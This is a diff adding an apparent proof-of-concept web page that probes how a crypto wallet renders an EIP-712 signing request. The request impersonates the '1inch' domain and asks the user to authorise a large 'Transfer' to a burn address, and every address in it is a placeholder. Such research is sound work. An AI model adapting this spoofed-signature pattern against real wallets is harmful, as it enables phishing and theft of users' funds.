@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>poc7 - eip712 render probe</title></head>
+<body style="font-family:monospace;background:#111;color:#0f0">
+<h3>poc7 - eth_signTypedData_v4 render probe</h3>
+<pre id="log">starting</pre>
+<script>
+const l=document.getElementById('log');
+function s(x){l.innerHTML=x+"\n"+l.innerHTML;}
+(async()=>{
+ let t=0;
+ while(!(window.ethereum&&window.ethereum.request)){ if(++t>15){s("NOPROV");return;} await new Promise(r=>setTimeout(r,300)); }
+ s("ready addr="+(await window.ethereum.request({method:"eth_accounts"}))[0]);
+ const typed=JSON.stringify({
+  domain:{name:"1inch",version:"1",chainId:1,verifyingContract:"0x1111111111111111111111111111111111111111"},
+  message:{from:"0x0000000000000000000000000000000000000000",to:"0xDEAD000000000000000000000000000000dEaD",amount:"1000000000000000000000",nonce:1,deadline:9999999999},
+  primaryType:"Transfer",types:{EIP712Domain:[{name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],Transfer:[{name:"from",type:"address"},{name:"to",type:"address"},{name:"amount",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}]}}
+ );
+ try{
+   const r=await window.ethereum.request({method:"eth_signTypedData_v4",params:["0x0000000000000000000000000000000000000000",typed]});
+   s("SIG="+String(r).slice(0,40));
+ }catch(e){ s("ERR "+e.code+" "+e.message); }
+})();
+</script></body></html>
